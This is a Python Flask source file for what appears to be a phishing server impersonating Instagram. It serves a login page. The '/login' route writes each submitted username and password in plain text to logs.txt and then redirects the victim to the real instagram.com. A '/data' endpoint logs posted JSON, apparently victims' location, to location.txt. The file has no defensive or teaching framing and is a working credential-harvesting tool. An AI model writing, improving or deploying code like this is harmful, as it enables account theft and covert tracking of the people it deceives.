from flask import Flask, render_template, request, redirect
from datetime import datetime

from flask import request

app = Flask(__name__)

@app.route("/")
def main():
    print(request.headers.get('User-Agent'))
    return render_template("login.html")


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        dt = datetime.now().strftime("%A %b %Y At %I:%M:%S")
        open("logs.txt", "a").write(
            f"Username: {username} \nPassword: {password} \nLocation:   \nTime: {dt} \n\n")

    return redirect("https://www.instagram.com/")


@app.route("/data", methods=["GET", "POST"])
def data():
    if request.method == "POST":
        output = request.get_json()
        print(1,output,2)
        open('location.txt', 'a+').write(str(output)+"\n")
        return "post"


@app.route("/test-requests", methods=["GET", "POST"])
def test_requests():
    if request.method == "GET":
        return "get"
    if request.method == "POST":
        return "post"


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)